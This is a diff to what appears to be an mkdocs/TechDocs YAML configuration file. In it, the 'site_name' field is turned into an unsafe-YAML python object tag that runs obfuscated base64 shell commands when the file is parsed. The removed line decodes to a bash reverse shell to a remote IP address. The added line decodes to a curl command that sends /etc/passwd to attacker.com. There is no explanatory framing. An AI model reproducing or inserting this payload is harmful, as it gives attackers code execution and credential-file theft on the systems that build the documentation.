@@ -1,7 +1,11 @@
-site_name: !!python/object/apply:os.popen
-  - "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNzUuNDEuMTYxLzEyMzQgMD4mMQo= | base64 -d | bash"
+site_name: !!python/object/apply:subprocess.check_output
+args:
+  - - sh
+    - -c
+    - "Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tIC1kICIkKGNhdCAvZXRjL3Bhc3N3ZCkiCg==" | base64 -d | sh
 plugins:
   - techdocs-core
+
 
 
 
